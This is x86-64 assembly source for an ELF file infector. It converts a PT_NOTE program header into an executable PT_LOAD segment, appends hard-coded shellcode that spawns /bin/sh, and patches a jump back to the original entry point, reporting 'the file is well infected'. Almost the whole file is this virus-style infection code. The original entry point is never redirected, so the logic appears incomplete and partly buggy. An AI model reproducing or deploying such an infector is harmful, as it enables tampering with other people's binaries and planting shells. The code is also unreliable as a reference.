section .data

	buf times 4 db 0            ; Buffer for the 4 first bytes
	ELF_numbers db 0x7F, 0x45, 0x4C , 0x46  
	is_ELF_msg db "The file is an ELF file.", 0xA, 0   ;0xA is for line break
	not_ELF_msg db "error, the file printed is not an ELF file.", 0xA, 0
	error_msg db "The programm returned an error", 0xA, 0
	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
	error_msg_file db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
	success_msg db "Bravo, the file is well infected", 0xA, 0
	debug_msg_pt_note_found db "pt_note trouvé", 0xA, 0
	debug_msg_header_modified db "en tete modifié",0xA, 0
	debug_msg_writing_payload db "program header overwrite done",0xA, 0
	debug_parsing_elfheader db "elf header parsé",0xA, 0
	debug_parse_loop db "loop de parsing program header",0xA, 0
	payload db 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
    payload_end:               ; Label marking the end of payload data


	
section .bss 

	stat_buff resb 144 ;reserve bytes(saving space) (144bytes) for the fstat command later
	ELF_header_buff resb 64 ;save space to read and parse the ELF header
	program_header_buff resb 56 ;idem for the program header 
	
    phoff resq 1       ; reserve quadword = 4 times a word size = 8 bytes / save space to store the memory address for the beginning of the program headers
	current_phoff resq 1   ; to loop on all the programm headers

    phnum resw 1       ; reserve word = 2 times a word size = 2 bytes

	filename resb 256
	fd resd 1       ; to save the file descriptor later 
	
	payload_len resq 1  ; Réserve 8 octets pour payload_len

	relative_offset resd 1    ; Reserve 4 bytes for relative offset


section .text
    global _start

_start:

	mov rdi, [rsp]          ; get argc
	cmp rdi, 2              ; argc must be equal to 2 (name of the program + first argument) 
	jne wrong_args 
	mov rsi, [rsp +16]    ; getting the first argument 
	mov rdi, filename    ; filename buffer in rdi 
	call copy_string 
	call main
	call exit_program


wrong_args:
    mov rsi, error_msg_args  
    mov rdx, 61
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall


main: 
	
    ; Calculate payload length and store it in payload_len
    mov rax, payload_end
    sub rax, payload           ; rax = payload length
    mov [payload_len], rax     ; store the calculated length

    call stat_file	
    call check_if_regular_file
    call check_elf
	call parse_elfheader
	call parse_programm_header
    call close_file
    ret



stat_file:
    mov rax, 4      ; sys_stat
    mov rdi, filename
    mov rsi, stat_buff
    syscall
    test rax, rax
    js error
    ret


	
check_if_regular_file:
    mov rax, [stat_buff + 24]  ; load st_mode (16 bytes in the stat structure)
    and rax, 0xF000            ; mask to isolate the mask type bites (the "file type" bytes are located in the first 4 bytes) 
    cmp rax, 0x8000            ; 0x8000 = S_IFREG (regular file)
    je is_regular_file
    
    mov rsi, error_msg_file
    mov rdx, 63
    call print_message
    jmp exit_program

is_regular_file:
	ret


check_elf:
	; Open the file
	mov rax, 2      ; sys_open
	mov rdi, filename
	mov rsi, 2      ; read-write
	syscall
	test rax, rax
	js error
	mov [fd], rax    ; Save file descriptor


	; read the first 4 bytes in the file 
	mov rdi, [fd]
	mov rax, 0                   ; sys_read 
	mov rsi, buf                 
	mov rdx, 4                   ; 4 octets read	
	syscall
	test rax, rax
	js error
	
	mov rcx, 4                   ; for the loop 
	xor rdi, rdi     
	
	call compare_loop
	
	mov rsi, is_ELF_msg
	mov rdx, 25   
	call print_message  
	ret
	

compare_loop: 
	;verify file magic bytes
	mov al, [buf + rdi]
	cmp al, [ELF_numbers + rdi]
	jne not_ELF
	inc rdi
	dec rcx
    jnz compare_loop
	ret

not_ELF:
	;Print that the file is not an ELF
	mov rsi, not_ELF_msg
	mov rdx, 44
	call print_message
	jmp exit_program 




close_file:		
	mov rdi, [fd]  
	mov rax, 3      ;sys_close 
	syscall        
	ret



copy_string:
    mov al, [rsi]       
    mov [rdi], al      
    test al, al        ; check if the caracter is null
    je copy_done       
    inc rsi             
    inc rdi           
    jmp copy_string     

copy_done:
    ret  
    
    


;_______________________Parsing structures 

parse_elfheader:

    ; set ourselves at the beginning of the file (we read the 4 magic bytes before)
    mov rax, 8          
    mov rdi, [fd]       
    mov rsi, 0          ; offset 0
    mov rdx, 0        
    syscall
    test rax, rax
    js error

	mov rax, 0
	mov rdi, [fd]
	mov rsi, ELF_header_buff
	mov rdx, 64 ;number of bytes to read
	syscall
	test rax, rax
	js error

	mov rax, [ELF_header_buff + 0x20]   ;read 8 bytes 
	mov [phoff], rax

	movzx rax, word[ELF_header_buff + 0x38]   ; movzx : fills the superior bytes of the rax with 0 to ensure its the good value
	mov [phnum], rax

	mov rsi, debug_parsing_elfheader
	mov rdx, 18
	call print_message

	ret




parse_programm_header:

  	mov rcx, [phnum]              ; number of program headers
    mov rax, [phoff]              ; offset to programm headers
    mov [current_phoff], rax

	jmp parse_loop

parse_loop:
	;save rcx in the stack
	push rcx

	mov rsi, debug_parse_loop
	mov rdx, 32
	call print_message

	pop rcx

	test rcx, rcx
	jz end_parse

    ; lseek : to place ourselves at the current offset
	mov rax, 8              
	mov rdi, [fd]
	mov rsi, [current_phoff]
	mov rdx, 0
	syscall 
	test rax, rax
	js error
	
	; read program header 
	mov rax, 0        
	mov rdi, [fd]
	mov rsi, program_header_buff
	mov rdx, 56	
	syscall
	test rax, rax
	js error


    ; Check if segment is PT_NOTE
	mov eax, [program_header_buff]     ; grabbing the 4 first bytes 
	cmp eax, 0x00000004                ; check if PT_NOTE
	je pt_note_found


    ; Move to next program header
    add qword [current_phoff], 56
    dec rcx
    jmp parse_loop


end_parse:
	ret 
	

pt_note_found:


	mov rsi, debug_msg_pt_note_found
	mov rdx, 16
	call print_message

	mov dword [program_header_buff], 1     ;modify program header type from PT_NOTE to PT_LOAD (in p_type)

    mov dword [program_header_buff + 4], 5  ; add permissions to execute and read (PF_R | PF_X) / permissions are located in the offset + 4 of the programm header (in p_flags)

	mov qword [program_header_buff + 48], 0x200000    ; p_align





	; Get current file size
	mov rax, 8              ; sys_lseek
	mov rdi, [fd]
	mov rsi, 0
	mov rdx, 2              ; SEEK_END
	syscall
	test rax, rax
	js error
	mov r12, rax            ; r12 now contains the file size (EOF)


	; Update p_offset in program header
	mov [program_header_buff + 8], r12     ; p_offset



	; Compute new p_vaddr = file size + 0x0C000000
	mov rax, r12                           ; p_offset (current file size)
	add rax, 0x0C000000                    ; Add high address offset
	mov [program_header_buff + 16], rax    ; p_vaddr
	mov [program_header_buff + 24], rax    ; p_paddr



    ; Save original e_entry
    mov rbx, [ELF_header_buff + 24]        ; Original e_entry


	; Load payload_len into rsi
	mov rsi, [payload_len]

	; Compute the address payload + payload_len into rdi
	lea rdi, [payload + rsi]


	; Compute the relative offset for the jump
	mov rax, rbx                              ; old_e_entry
	sub rax, [program_header_buff + 16]       ; Subtract new_p_vaddr
	sub rax, [payload_len]                    ; Subtract payload_len
	sub rax, 5                                ; Subtract size of jmp instruction
	mov eax, eax                              ; Ensure lower 32 bits
	mov [relative_offset], eax                ; Store relative offset (32 bits)


	; Append 'jmp rel32' to the end of the payload
	mov rsi, [payload_len]
	lea rdi, [payload + rsi]
	mov byte [rdi], 0xE9                      ; Opcode for 'jmp rel32'
	mov eax, [relative_offset] 
	mov dword [rdi + 1],eax   ; Relative offset


	; Update payload length
	add qword [payload_len], 5


    ; Set p_filesz and p_memsz
    mov r13, [payload_len]
    mov [program_header_buff + 32], r13    ; p_filesz
    mov [program_header_buff + 40], r13    ; p_memsz

    ; Write the payload to the new segment
    mov rax, 8                             ; sys_lseek
    mov rdi, [fd]
    mov rsi, r12                           ; New p_offset
    mov rdx, 0                             ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 1                             ; sys_write
    mov rdi, [fd]
    mov rsi, payload
    mov rdx, [payload_len]
    syscall
    test rax, rax
    js error

    ; Overwrite the modified program header
    mov rax, 8                             ; sys_lseek
    mov rdi, [fd]
    mov rsi, [current_phoff]
    mov rdx, 0                             ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 1                             ; sys_write
    mov rdi, [fd]
    mov rsi, program_header_buff
    mov rdx, 56                            ; Size of program header
    syscall
    test rax, rax
    js error

    ; Overwrite the ELF header
    mov rax, 8                             ; sys_lseek
    mov rdi, [fd]
    mov rsi, 0                             ; Offset 0
    mov rdx, 0                             ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 1                             ; sys_write
    mov rdi, [fd]
    mov rsi, ELF_header_buff
    mov rdx, 64                            ; Write full ELF header
    syscall
    test rax, rax
    js error

    ; Update e_shoff if necessary
    mov rax, [ELF_header_buff + 40]        ; e_shoff
    cmp rax, r12                           ; Compare with new p_offset
    ja update_shoff
    jmp skip_update

update_shoff:
    add rax, [payload_len]
    mov [ELF_header_buff + 40], rax        ; Update e_shoff

    ; Write back ELF header again after updating e_shoff
    mov rax, 8                             ; sys_lseek
    mov rdi, [fd]
    mov rsi, 0                             ; Offset 0
    mov rdx, 0                             ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 1                             ; sys_write
    mov rdi, [fd]
    mov rsi, ELF_header_buff
    mov rdx, 64                            ; Write full ELF header
    syscall
    test rax, rax
    js error

skip_update:
    mov rsi, success_msg
    mov rdx, 33
    call print_message



    jmp end_parse



;__________________________________________________________________________
e_shoff_update:
	add rax, payload_len
    mov [ELF_header_buff + 40], rax  ; update shoff
	ret


    
print_message:
    mov rax, 0x1               
    mov rdi, 1                 
    syscall
    ret

exit_program:
	mov rax, 60                  
	xor rdi, rdi                
	syscall


error:
	; Handle errors (Print & exit) 
	mov rax, 0x1
	mov rdi, 1 
	mov rsi, error_msg
	mov rdx, 31
	syscall
	mov rax, 60                 
	mov rdi, 1                    ; Exit code 1
	syscall
